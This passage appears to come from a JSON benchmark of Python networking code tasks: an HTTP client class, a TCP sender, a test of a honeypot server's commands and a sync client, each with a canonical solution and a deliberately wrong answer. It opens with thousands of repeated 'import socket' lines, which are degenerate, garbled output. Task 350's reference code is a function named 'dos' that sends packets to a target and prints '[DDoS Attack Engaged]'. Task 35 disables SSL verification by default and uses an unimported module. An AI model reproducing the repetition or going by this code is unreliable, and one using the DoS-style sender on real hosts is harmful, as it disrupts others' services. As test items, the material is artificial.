socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Python class that provides HTTP client functionality using both the `httpx` and `requests` libraries, with support for common HTTP methods, SSL verification control, and custom headers.\n\nClass Description: The `HTTPClient` class encapsulates HTTP request functionality, offering methods to perform GET requests and check API/web accessibility. It supports custom headers and SSL verification configuration.\n\nAttributes:\n\nheader: dict - Dictionary containing HTTP headers to be sent with requests (default includes User-Agent)\nverify: bool - Flag indicating whether to verify SSL certificates (default is False)\n\nMethods:\n\ntest_api_web: test_api_web(url: str) -> Optional[Tuple[str, str]] - Checks if a web API/URL is accessible and returns a tuple containing the page title and URL if successful, None otherwise\nget_request: get_request(url: str, params: dict = None) -> requests.Response - Sends a GET request using the requests library and returns the Response object\nclient_get: client_get(url: str) -> httpx.Response - Sends a GET request using httpx client and returns the Response object",
    "Canonical_solution": "import httpx\nimport requests\nfrom typing import Optional, Tuple\nfrom loguru import logger\n\nclass HTTPClient:\n    def __init__(self, headers: dict = None, verify_ssl: bool = False):\n        self.header = headers or {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36\"\n        }\n        self.verify = verify_ssl\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        \"\"\"Check if API web is accessible\n        :return: Tuple containing (title, url) if successful, None otherwise\n        \"\"\"\n        if url is None:\n            return None\n            \n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            try:\n                resp = client.get(url=url).text\n                title = re.findall('<title>(.*?)</title>', resp)\n                if title:\n                    logger.info(f\"{url} title:{title[0]}\")\n                    return (title[0], url)\n            except httpx.HTTPError as why:\n                logger.error(f\"{url} request error! {why}\")\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        \"\"\"Send GET request using requests library\n        :return: Response object\n        \"\"\"\n        try:\n            return requests.get(\n                url,\n                headers=self.header,\n                params=params,\n                timeout=8,\n                verify=self.verify\n            )\n        except Exception as e:\n            logger.error(f\"GET request failed: {e}\")\n            raise\n\n    def client_get(self, url: str) -> httpx.Response:\n        \"\"\"Send GET request using httpx client\n        :return: Response object\n        \"\"\"\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "class HTTPClient:\n    def __init__(self, header: dict = None, verify: bool = False):\n        self.header = header or {'User-Agent': 'HTTPClient/1.0'}\n        self.verify = verify\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        try:\n            response = self.get_request(url)\n            if response.status_code == 200:\n                from bs4 import BeautifulSoup\n                soup = BeautifulSoup(response.text, 'html.parser')\n                title = soup.title.string if soup.title else ''\n                return (title, url)\n            return None\n        except Exception as e:\n            return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        headers = self.header.copy()\n        return requests.get(url, headers=headers, params=params, verify=self.verify)\n\n    def client_get(self, url: str) -> httpx.Response:\n        return httpx.get(url, headers=self.header, verify=self.verify)"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host and port, sends a message multiple times, and handles potential connection errors.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, sends a specified message multiple times (including one sendto operation), and properly closes the connection. It includes error handling for connection failures and provides status messages about the operation.\n\nInput:\n- host: str - The target server's IP address or hostname\n- port: int - The target port number to connect to\n- message: bytes - The message to be sent to the server (should be in bytes format)\n\nOutput:\n- None (prints status messages to console)\n- Returns None implicitly\n- Side effect: Sends network packets to the specified host and port",
    "Canonical_solution": "import socket\n\ndef dos(host, port, message):\n    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        ddos.connect((host, port))\n        ddos.send(message)\n        ddos.sendto(message, (host, port))\n        ddos.send(message)\n    except socket.error as msg:\n        print(\"|[Connection Failed]         |\")\n    print(\"|[DDoS Attack Engaged]       |\")\n    ddos.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "def connect_and_send(host, port, message):\n    import socket\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n            sock.connect((host, port))\n            print(f\"Connected to {host} on port {port}\")\n            for _ in range(3):  # Send message 3 times\n                sock.sendall(message)\n                print(\"Message sent\")\n    except socket.error as e:\n        print(f\"Connection failed: {e}\")"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Write a Python function that tests command responses from a Kamstrup management server by sending specific commands and verifying the responses against expected values.\n\nFunction Description: The function establishes a TCP connection to a Kamstrup management server, sends a help command and a specific packet command, then verifies if the responses match the expected values from a predefined response dictionary. The function returns True only if both responses match their expected values.\n\nInput:\n- packet_type: [str] - The key used to look up the expected response in the RESPONSES dictionary for the packet command.\n- help_msg_command: [bytes] - The byte string representing the help command to be sent to the server.\n- packet_msg_command: [bytes] - The byte string representing the packet command to be sent to the server.\n- kamstrup_management_server: [object] - An object containing the server's connection details, specifically the server port.\n\nOutput:\n- [bool] - Returns True if both the help command response and packet command response match their expected values in the RESPONSES dictionary, otherwise returns False.",
    "Canonical_solution": "from gevent import socket\nfrom conpot.tests.data.kamstrup_management_data import RESPONSES\n\ndef check_command_resp_help_message(\n    packet_type, help_msg_command, packet_msg_command, kamstrup_management_server\n):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"127.0.0.1\", kamstrup_management_server.server.server_port))\n    _ = s.recv(1024)  # receive the banner\n    s.sendall(help_msg_command)  # test the help command\n    help_data = s.recv(1024)\n    help_response = help_data == RESPONSES[\"H\"][packet_type]\n    s.sendall(packet_msg_command)\n    pkt_data = s.recv(1024)\n    packet_resp = pkt_data == RESPONSES[packet_type]\n    s.close()\n    return help_response and packet_resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\nRESPONSES = {\n    \"help\": b\"Help command response\",\n    \"packet\": b\"Packet command response\"\n}\n\ndef test_kamstrup_commands(packet_type, help_msg_command, packet_msg_command, kamstrup_management_server):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((kamstrup_management_server.ip, kamstrup_management_server.port))\n            s.sendall(help_msg_command)\n            help_response = s.recv(1024)\n            if help_response != RESPONSES[\"help\"]:\n                return False\n            \n            s.sendall(packet_msg_command)\n            packet_response = s.recv(1024)\n            if packet_response != RESPONSES[packet_type]:\n                return False\n                \n        return True\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n        return False"
  },
  {
    "Task_id": 354,
    "Instruction": "Task Description: Implement a TCP client class in Python that handles secure connections, message synchronization, and various types of message exchanges with a server.\n\nClass Description: The Client class represents a TCP client that connects to a server, authenticates, sends and receives messages, and handles message synchronization. It supports both plain and SSL-encrypted connections.\n\nAttributes:\n- seq: [int] - Sequence number for message tracking\n- sock: [socket.socket] - Socket object for server communication\n- sync_key: [int] - Current synchronization key\n- syncing: [bool] - Flag indicating if synchronization is in progress\n- sync_timestamp: [int] - Timestamp of last synchronization attempt\n- next_sync_key: [int] - Next synchronization key to use\n\nMethods:\n- __init__() -> [None] - Initializes the client with default values\n- connect_server(device_id: str, token: str, host: str=None, port: int=24430, use_ssl: bool=True) -> [bool] - Connects to the server, authenticates using device ID and token, and returns connection status\n- close() -> [None] - Closes the connection with the server\n- recv_message() -> [tuple] - Receives messages from server and handles timeouts with ping messages\n- handle_message(cmd: int, s: int, m: any) -> [None] - Handles different types of incoming messages and triggers appropriate actions\n- ack_message(s: int) -> [None] - Sends acknowledgment for received messages\n- send_peer_message(msg: any) -> [None] - Sends a peer-to-peer message to the server\n- send_group_message(msg: any) -> [None] - Sends a group message to the server\n- send_sync() -> [None] - Initiates synchronization with the server\n- send_sync_key() -> [None] - Sends current synchronization key to the server",
    "Canonical_solution": "import struct\nimport socket\nimport select\nimport ssl\n\nclass Client:\n    def __init__(self):\n        self.seq = 0\n        self.sock = None\n        self.sync_key = 0\n        self.syncing = False\n        self.sync_timestamp = 0\n        self.next_sync_key = 0\n\n    def connect_server(self, device_id, token, host=None, port=24430, use_ssl=True):\n        address = (host if host else \"imnode2.gobelieve.io\", port)\n        if use_ssl:\n            sock_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            context = ssl.create_default_context()\n            sock = context.wrap_socket(sock_fd, server_hostname=address[0])\n        else:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            \n        sock.connect(address)\n        auth = AuthenticationToken()\n        auth.token = token\n        auth.device_id = device_id\n        self.seq = self.seq + 1\n        send_message(MSG_AUTH_TOKEN, self.seq, auth, sock)\n        cmd, _, _, msg = recv_message(sock)\n        if cmd != MSG_AUTH_STATUS or msg != 0:\n            return False\n\n        self.sock = sock\n        return True\n\n    def close(self):\n        if self.sock:\n            self.sock.close()\n\n    def recv_message(self):\n        while True:\n            rlist, _, xlist = select.select([self.sock], [], [self.sock], 60)\n            if not rlist and not xlist:\n                self.seq += 1\n                send_message(MSG_PING, self.seq, None, self.sock)\n                continue\n            if xlist:\n                return 0, 0, None\n            if rlist:\n                cmd, s, _, m = recv_message(self.sock)\n                self.handle_message(cmd, s, m)\n                return cmd, s, m\n\n    def handle_message(self, cmd, s, m):\n        if cmd == MSG_IM:\n            self.ack_message(s)\n        elif cmd == MSG_GROUP_IM:\n            self.ack_message(s)\n        elif cmd == MSG_SYSTEM:\n            self.ack_message(s)\n        elif cmd == MSG_SYNC_NOTIFY:\n            new_sync_key = m\n            now = int(time.time())\n            if new_sync_key > self.sync_key and (not self.syncing or now - self.sync_timestamp > 3):\n                self.send_sync()\n                self.syncing = True\n                self.sync_timestamp = int(time.time())\n            elif new_sync_key > self.next_sync_key:\n                self.next_sync_key = new_sync_key\n        elif cmd == MSG_SYNC_END:\n            new_sync_key = m\n            if new_sync_key > self.sync_key:\n                self.sync_key = new_sync_key\n                self.send_sync_key()\n            self.syncing = False\n            if self.next_sync_key > self.sync_key:\n                self.send_sync()\n                self.syncing = True\n                self.sync_timestamp = int(time.time())\n                self.next_sync_key = 0\n\n    def ack_message(self, s):\n        self.seq += 1\n        send_message(MSG_ACK, self.seq, s, self.sock)\n\n    def send_peer_message(self, msg):\n        self.seq += 1\n        send_message(MSG_IM, self.seq, msg, self.sock)\n\n    def send_group_message(self, msg):\n        self.seq += 1\n        send_message(MSG_GROUP_IM, self.seq, msg, self.sock)\n\n    def send_sync(self):\n        self.seq += 1\n        send_message(MSG_SYNC, self.seq, self.sync_key, self.sock)\n\n    def send_sync_key(self):\n        self.seq += 1\n        send_message(MSG_SYNC_KEY, self.seq, self.sync_key, self.sock)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport ssl\nimport time\n\nclass Client:\n    def __init__(self):\n        self.seq = 0\n        self.sock = None\n        self.sync_key = 0\n        self.syncing = False\n        self.sync_timestamp = 0\n        self.next_sync_key = 0\n\n    def connect_server(self, device_id: str, token: str, host: str=None, port: int=24430, use_ssl: bool=True) -> bool:\n        if not host:\n            host = 'localhost'\n        try:\n            if use_ssl:\n                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n                self.sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)\n            else:\n                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.connect((host, port))\n            # Authentication logic would go here\n            return True\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            return False\n\n    def close(self) -> None:\n        if self.sock:\n            self.sock.close()\n\n    def recv_message(self) -> tuple:\n        try:\n            data = self.sock.recv(1024)\n            if not data:\n                return (None, None)\n            return (data, self.seq)\n        except socket.timeout:\n            # Handle timeout with ping message\n            self.send_peer_message(b'PING')\n            return (None, None)\n\n    def handle_message(self, cmd: int, s: int, m: any) -> None:\n        if cmd == 1:\n            # Handle command 1\n            pass\n        elif cmd == 2:\n            # Handle command 2\n            pass\n        # Add more command handlers as needed\n\n    def ack_message(self, s: int) -> None:\n        msg = f\"ACK {s}\".encode()\n        self.sock.send(msg)\n\n    def send_peer_message(self, msg: any) -> None:\n        self.sock.send(msg)\n\n    def send_group_message(self, msg: any) -> None:\n        self.sock.send(msg)\n\n    def send_sync(self) -> None:\n        self.syncing = True\n        